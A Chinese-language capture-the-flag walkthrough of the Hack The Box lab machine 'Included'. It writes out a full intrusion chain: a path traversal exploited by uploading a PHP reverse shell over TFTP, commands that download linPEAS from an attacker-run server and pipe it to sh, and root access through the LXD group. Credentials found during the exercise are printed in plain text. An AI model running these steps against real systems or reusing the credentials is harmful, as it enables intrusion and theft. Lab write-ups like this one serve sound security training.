# Included
###### tags: `HTB_Starting Point`

1. 枚舉(Enumeration)
* 先用Ping確認VPN可以成功連線到靶機
```
ping -c 2 10.10.10.55
```
![](https://i.imgur.com/yuMLMks.png)
* 用Nmap做PortScan，看有哪些開啟的Port，並儲存結果
```
nmap -A -T4 -oA nmap/Included 10.10.10.55
```
![](https://i.imgur.com/MX2idcB.png)

從上圖可知，只有80 Port是開啟的狀態

* 再次使用Nmap，查看HTTP Server的系統以及版本
```
nmap -sV -sC -oN nmap/Included.namp -p 80 10.10.10.55
```
![](https://i.imgur.com/YVvMOQo.png)

* 開啟Web Browser以及Burp Suite查看一下80 Port

![](https://i.imgur.com/qYxi59Z.png)

![](https://i.imgur.com/cgxpZaw.png)

沒有看到什麼有趣的地方

* 一樣使用Dirsearch查看有沒有隱藏的目錄
```
sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.55 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
![](https://i.imgur.com/XAFYJHF.png)
嘗試連往/server-status，但權限不夠
![](https://i.imgur.com/MY25ecc.png)

* 通過查看 URL，我們可以假設這裡存在一些[目錄遍歷漏洞](https://portswigger.net/web-security/file-path-traversal)。所以讓我們檢查一下。

![](https://i.imgur.com/mOKoJix.png)
![](https://i.imgur.com/Rza3ylb.png)
![](https://i.imgur.com/rzp9DUU.png)

如上圖所見，我們有目錄遍歷漏洞。如果我們可以上傳任何反向 shell 腳本，我們就可以調用該文件並利用此漏洞獲得成功。
* 再仔細看一次/etc/passwd 中可用的所有用戶，有tftp的帳號，由於是走UDP69，可以用namp針對[TFTP服務]https://nmap.org/nsedoc/scripts/tftp-enum.html)進行掃描
![](https://i.imgur.com/tzqpEkW.png)

```
sudo nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=customlist.txt 10.10.10.55
```
![](https://i.imgur.com/HNrFg4y.png)

```
sudo nmap -sU -p69 10.10.10.55
```
![](https://i.imgur.com/vfyxGEH.png)

* 嘗試連接到該服務。
```
sudo tftp 10.10.10.55
```
![](https://i.imgur.com/NulssPh.png)

我們可以連接到該服務，也可以使用該服務上傳任何文件。但是該如何知道該文件存儲的確切路徑？
* 可以再次檢查 /etc/passwd 文件以了解文件上傳到 TFTP 後的位置(/var/lib/tftpboot)。
![](https://i.imgur.com/rnWpLIj.png)

2. 首先我們需要創建 PHP 反向 Shell。我們可以簡單地從我們的 kali webshell 目錄或使用[revshell.com](https://www.revshells.com/)自動創建一個。
```
vim  Reverse.php
head Reverse.php
```
![](https://i.imgur.com/dHeSdG1.png)


* 將檔案用TFTP上傳
```
put Revese.php
```
![](https://i.imgur.com/QwBXbeA.png)

* Exploit!
```
curl 10.10.10.55/?file=../../../../../var/lib/tftpboot/Reverse.php
```
![](https://i.imgur.com/fCcdFDD.png)
![](https://i.imgur.com/czk4gJx.png)

* 升級Shell
```
python3 -c "import pty; pty.spawn('/bin/bash')"
```
![](https://i.imgur.com/uNv4vGD.png)
* 獲得一般使用者權限
再次看一下目錄遍歷的清單，可以發現一個帳戶為Mike，還記得這些靶機環環相扣嗎?
我們曾經在其他靶機上獲得下列使用者帳戶跟密碼
mike：Sheffield19

```
su mike
cat /home/mike/user.txt
```
![](https://i.imgur.com/uE4xBoV.png)

3. 提權(Privilege Escalation)
* 當涉及到提權時，我們可以手動逐一檢查，或者我們可以簡單地運行任何自動化腳本來為我們進行搜索。由於靶機使用的Linux，選擇使用[linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
```
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
```
![](https://i.imgur.com/CNA5TzO.png)

* 啟用 python demon server
```
sudo python3 -m http.server
```
![](https://i.imgur.com/vgyk4I3.png)

* 在靶機端連到我們架設的sever下載linPEAS並執行
``` | sh
```
* 我們可以通過查看輸出文件來找出可以利用的地方

![](https://i.imgur.com/s9nan9u.png)

由上圖可知，mike在LXD群組中。 LXD群組是Linux系統中的一個高權限群組。

* 這裡有一篇關於[lxd/lxc提權](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2)的方法，首先從Github上Clone到Kali主機上並建構一個alpine image。

```
su root
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
/build-alpine
```
![](https://i.imgur.com/niUjhmm.png)

* 執行build-alpine文件後，應該會創建一個tar.gx文件，現在我們再次用python Demon web server將檔案上傳，讓靶機下載
```
sudo python3 -m http.server
```
![](https://i.imgur.com/vnti5Ff.png)

```
wget http://10.10.14.10:8000/alpine-v3.13-x86_64-20210603_0628.tar.gz
```
![](https://i.imgur.com/HawOZrq.png)

* 導入映像並使用它創建特權容器。
```
lxc image import alpine-v3.13-x86_64-20210603_0628.tar.gz --alias myimage
xc image list
lxc init myimage mycontainer -c security.privileged=true
```
![](https://i.imgur.com/BLnex54.png)

* 接下來我們需要將 /root 掛載到鏡像中。
```
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
![](https://i.imgur.com/siNW7hC.png)


* 現在讓我們與容器進行交互
```
lxc start mycontainer 
lxc exec mycontainer /bin/sh
```
![](https://i.imgur.com/aQZjtHS.png)

* Get Flag
```
cat /mnt/root/root/root.txt
```
![](https://i.imgur.com/7LyVQOU.png)

4. Post Exploitation

* 在/mnt/root/root路徑下，我們可以發現login.sql檔案
```
cd /mnt/root/root
ls -al
```
![](https://i.imgur.com/Q9HlxLn.png)

* 發現機敏資料Daniel : >SNDv*2wzLWf
```
cat login.sql 
```
![](https://i.imgur.com/KI4SrOb.png)
